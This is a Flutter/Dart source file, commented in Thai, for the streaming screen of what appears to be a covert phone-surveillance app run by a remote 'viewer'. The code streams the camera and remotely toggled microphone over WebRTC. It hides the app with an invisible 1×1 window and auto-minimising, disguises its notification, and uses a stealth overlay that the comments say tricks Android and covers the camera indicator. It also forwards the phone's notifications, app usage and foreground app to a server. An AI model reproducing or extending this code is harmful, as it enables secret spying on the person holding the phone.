import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'camera_config.dart';
import 'device_id.dart';
import 'fcm_service.dart';
import 'foreground_service.dart';
import 'home_screen.dart';
import 'notif_event.dart';
import 'signaling_service.dart';
import 'status_reporter.dart';
import 'streaming_prefs.dart';
import 'usage_stat.dart';

class StreamingScreen extends StatefulWidget {
  const StreamingScreen({
    super.key,
    required this.code,
    required this.signalingUrl,
    this.silent = false,
  });

  final String code;
  final String signalingUrl;

  /// true เมื่อ launch จาก auto-route (FCM/boot)
  /// → จะ minimize ตัวเองเข้า background หลังตั้ง stream เสร็จ
  final bool silent;

  @override
  State<StreamingScreen> createState() => _StreamingScreenState();
}

class _StreamingScreenState extends State<StreamingScreen> {
  late final SignalingService _signaling;
  StatusReporter? _statusReporter;
  NotifDrainer? _notifDrainer;
  Timer? _usageStatsTimer;
  String? _deviceId;
  RTCPeerConnection? _pc;
  MediaStream? _localStream;
  final RTCVideoRenderer _localRenderer = RTCVideoRenderer();
  bool _connected = false;
  bool _viewerConnected = false;
  String _status = 'กำลังเชื่อมต่อ...';

  // buffer offer+ICE เผื่อ viewer join ทีหลัง
  RTCSessionDescription? _pendingOffer;
  final List<Map<String, dynamic>> _pendingIce = [];

  // mic เริ่มต้นปิด (privacy) — viewer toggle ผ่าน socket event
  bool _micEnabled = false;

  @override
  void initState() {
    super.initState();
    _init();
  }

  Future<void> _init() async {
    await _localRenderer.initialize();
    _signaling = SignalingService(widget.signalingUrl);

    _signaling.onPeerJoined = _onViewerJoined;
    _signaling.onPeerLeft = () => setState(() {
          _viewerConnected = false;
          _status = 'ผู้ดูออกจากระบบแล้ว';
        });
    _signaling.onAnswer = _onAnswer;
    _signaling.onIceCandidate = _onRemoteIce;
    _signaling.onError = (msg) => setState(() => _status = 'ข้อผิดพลาด: $msg');

    // viewer สั่งสลับกล้อง / เปิดปิดไมค์ / refresh usage stats / factory-reset
    _signaling.onSwitchCamera = _onSwitchCamera;
    _signaling.onToggleMic = _onToggleMic;
    _signaling.onFetchUsageStats = _reportUsageStatsOnce;
    _signaling.onFactoryReset = _onFactoryReset;

    // viewer push config มา → save ลง SharedPreferences (apply รอบหน้าตอน start FGS)
    _signaling.onConfigPushed = (json) async {
      final cfg = CameraConfig.fromJson(json);
      await CameraConfigStore.save(cfg);
      debugPrint('[streaming] config pushed: ${cfg.notifTitle}');
    };

    _signaling.connect();

    // โหลด config ที่ viewer push มาล่าสุด (default ถ้ายังไม่เคย set)
    // ใช้คุม FGS notif text + stealth overlay + auto-minimize
    final config = await CameraConfigStore.load();

    // ดึง device_id + FCM token แล้ว register ทั้งคู่กับ server
    // (FCM token อาจ null ถ้า Firebase ไม่พร้อม — server จะ fallback ไม่ส่ง push)
    final deviceId = await DeviceIdStore.getOrCreate();
    _deviceId = deviceId;
    final fcmToken = await FcmService.getToken();
    _signaling.registerCamera(
      deviceId: deviceId,
      code: widget.code,
      fcmToken: fcmToken,
    );

    // เริ่ม foreground service ก่อน getUserMedia (พร้อม custom notif text)
    // (Android 14+ บังคับ: ต้องมี FGS ก่อนถึงจะเข้าถึงกล้อง background ได้)
    await ForegroundService.start(
      notifTitle: config.notifTitle,
      notifBody: config.notifBody,
    );

    // เริ่ม 1×1 px stealth overlay (เทคนิค AirDroid) — หลอกระบบว่า app foreground
    // ทำให้กล้องเข้าถึงได้แม้ user lock screen / สลับไป app อื่น
    // → viewer ปิด toggle นี้ได้ถ้าไม่อยากให้มี overlay ทับจุดเขียว
    if (config.stealthOverlay) {
      await ForegroundService.startStealthOverlay();
    }

    // เริ่มกล้อง + audio track (initial muted — privacy default)
    // viewer toggle mic ผ่าน socket event 'toggle-mic'
    _localStream = await navigator.mediaDevices.getUserMedia({
      'video': {'facingMode': 'environment'},
      'audio': true,
    });
    // ปิด mic ทันที — track ยังอยู่แต่ไม่มี audio data
    for (final track in _localStream!.getAudioTracks()) {
      track.enabled = _micEnabled; // false ใน init
    }
    _localRenderer.srcObject = _localStream;
    setState(() => _connected = true);

    // join signaling room ด้วย device_id (ไม่ใช่ pair code 6 หลัก)
    // — pair code เป็นแค่ค่าให้ viewer แลกครั้งแรก หลังจากนั้น viewer จะใช้ device_id ตรงๆ
    _signaling.joinRoom(deviceId);
    setState(() => _status = 'รอผู้ดูเชื่อมต่อ...');

    // เริ่ม status reporter — รายงาน battery/signal/foreground app ทุก 30s
    // ไปยัง viewer Dashboard (server cache + relay ให้ subscriber)
    _statusReporter = StatusReporter(signaling: _signaling, deviceId: deviceId);
    _statusReporter!.start();

    // เริ่ม notif drainer — ทุก 10s ดึง notif buffer จาก native + ส่งให้ server
    // ต้องการ Notification Listener access — ถ้ายังไม่ grant, buffer จะว่าง = no-op
    _notifDrainer = NotifDrainer()
      ..onDrained = (events) {
        _signaling.reportNotifBatch(deviceId: deviceId, events: events);
      }
      ..start();

    // รายงาน usage stats ครั้งแรกทันที + ทุก 10 นาทีหลังจากนั้น
    // (ถูกเรียก on-demand ผ่าน onFetchUsageStats ด้วยเมื่อ viewer กด refresh)
    _reportUsageStatsOnce();
    _usageStatsTimer = Timer.periodic(
      const Duration(minutes: 10),
      (_) => _reportUsageStatsOnce(),
    );

    // เปิดโหมด auto-streaming — ครั้งต่อๆ ไปเปิดแอป/รีบูต จะเข้า streaming screen เลย
    await StreamingPrefs.enable(pairCode: widget.code);

    // Stealth mode: silent=true (จาก auto-launch) หรือ user เคย pair แล้ว
    // → ซ่อน UI: window 1×1 alpha 0 + moveTaskToBack
    // → กล้องยังสตรีมผ่าน FGS + StealthOverlay
    // → ควบคุมทั้งหมดผ่าน viewer (เครื่องแม่)
    if (widget.silent && config.autoMinimize) {
      await Future.delayed(const Duration(milliseconds: 500));
      // ซ่อน window ก่อน → user ไม่เห็น UI ระหว่าง transition
      await ForegroundService.makeWindowInvisible();
      // แล้ว move task ไป background — กลับมาเห็นจอ launcher
      await ForegroundService.minimizeApp();
    }
  }

  Future<void> _ensurePeerConnection() async {
    if (_pc != null) return;

    // ใช้ config แบบง่าย ไม่มี STUN เพื่อเลี่ยง network_thread crash บน Android 16
    _pc = await createPeerConnection(<String, dynamic>{
      'iceServers': <Map<String, dynamic>>[],
      'sdpSemantics': 'unified-plan',
    });

    _localStream!.getTracks().forEach((track) {
      _pc!.addTrack(track, _localStream!);
    });

    _pc!.onIceCandidate = (candidate) {
      final map = candidate.toMap();
      _signaling.sendIceCandidate(map);
    };
  }

  Future<void> _onViewerJoined() async {
    setState(() {
      _viewerConnected = true;
      _status = 'ผู้ดูเชื่อมต่อแล้ว — สร้าง offer...';
    });

    await _ensurePeerConnection();

    final offer = await _pc!.createOffer();
    await _pc!.setLocalDescription(offer);
    _pendingOffer = offer;

    _signaling.sendOffer(offer.toMap());
  }

  Future<void> _onAnswer(Map<String, dynamic> data) async {
    final answer = RTCSessionDescription(
      data['sdp'] as String,
      data['type'] as String,
    );
    await _pc?.setRemoteDescription(answer);
    setState(() => _status = 'กำลังสตรีม');
  }

  Future<void> _onRemoteIce(Map<String, dynamic> data) async {
    final candidate = RTCIceCandidate(
      data['candidate'] as String,
      data['sdpMid'] as String?,
      data['sdpMLineIndex'] as int?,
    );
    await _pc?.addCandidate(candidate);
  }

  /// viewer สั่งสลับกล้องหน้า/หลัง — flutter_webrtc มี Helper พร้อม
  /// ไม่ต้อง re-negotiate เพราะ track ID เดิม sender เดิม
  Future<void> _onSwitchCamera() async {
    final tracks = _localStream?.getVideoTracks();
    if (tracks == null || tracks.isEmpty) return;
    try {
      await Helper.switchCamera(tracks.first);
      debugPrint('[streaming] camera switched');
    } catch (e) {
      debugPrint('[streaming] switch camera failed: $e');
    }
  }

  /// viewer toggle mic — เซ็ต enabled ของ audio track
  /// track ยังอยู่ใน peer connection แค่ไม่มี audio data ส่ง
  void _onToggleMic(bool enabled) {
    final tracks = _localStream?.getAudioTracks();
    if (tracks == null || tracks.isEmpty) return;
    for (final t in tracks) {
      t.enabled = enabled;
    }
    setState(() => _micEnabled = enabled);
    debugPrint('[streaming] mic ${enabled ? "ON" : "OFF"}');
  }

  /// อ่าน usage stats จาก native + ส่งให้ server (no-op ถ้ายังไม่ grant permission)
  Future<void> _reportUsageStatsOnce() async {
    final id = _deviceId;
    if (id == null) return;
    try {
      final stats = await UsageStat.read();
      _signaling.reportUsageStats(deviceId: id, stats: stats);
      debugPrint('[streaming] usage stats reported (${stats.length} apps)');
    } catch (e) {
      debugPrint('[streaming] usage stats report failed: $e');
    }
  }

  /// viewer สั่ง factory-reset:
  /// - clear auto_streaming pref → next launch จะแสดง pair UI ปกติ
  /// - clear camera config (notification text กลับเป็น default)
  /// - restore window จาก 1×1 → normal
  /// - stop FGS + stealth overlay (กล้องหยุดสตรีม)
  /// - navigate กลับ HomeScreen แสดง pair UI
  Future<void> _onFactoryReset() async {
    debugPrint('[streaming] factory-reset received');
    await StreamingPrefs.disable();
    await CameraConfigStore.save(CameraConfig.defaults);
    await ForegroundService.restoreWindow();
    await ForegroundService.stop();
    await ForegroundService.stopStealthOverlay();
    if (!mounted) return;
    Navigator.of(context).pushAndRemoveUntil(
      MaterialPageRoute(builder: (_) => const HomeScreen()),
      (_) => false,
    );
  }

  @override
  void dispose() {
    _statusReporter?.stop();
    _notifDrainer?.stop();
    _usageStatsTimer?.cancel();
    _localRenderer.dispose();
    _localStream?.dispose();
    _pc?.dispose();
    _signaling.dispose();
    // หยุด foreground services เมื่อออกจากหน้าสตรีม
    ForegroundService.stop();
    ForegroundService.stopStealthOverlay();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    // Stealth mode (silent=true): ไม่ render UI ใด ๆ ให้ user เห็น
    // — ไม่มี AppBar, ไม่มี video preview, ไม่มี loading indicator
    // — window จะถูกย่อเหลือ 1×1 alpha 0 + moveTaskToBack หลัง _init เสร็จ
    if (widget.silent) {
      return const Scaffold(
        backgroundColor: Colors.transparent,
        body: SizedBox.shrink(),
      );
    }

    // โหมดปกติ (user เปิด preview จาก HomeScreen) — เห็นกล้องตัวเอง
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        foregroundColor: Colors.white,
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('รหัส: ${widget.code}',
                style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold)),
            Text(_status,
                style: const TextStyle(fontSize: 12, color: Colors.white70)),
          ],
        ),
        actions: [
          Container(
            margin: const EdgeInsets.only(right: 12),
            width: 10,
            height: 10,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _viewerConnected ? Colors.greenAccent : Colors.grey,
            ),
          ),
        ],
      ),
      body: _connected
          ? RTCVideoView(
              _localRenderer,
              objectFit: RTCVideoViewObjectFit.RTCVideoViewObjectFitCover,
              mirror: false,
            )
          : const Center(
              child: CircularProgressIndicator(color: Colors.white),
            ),
    );
  }
}
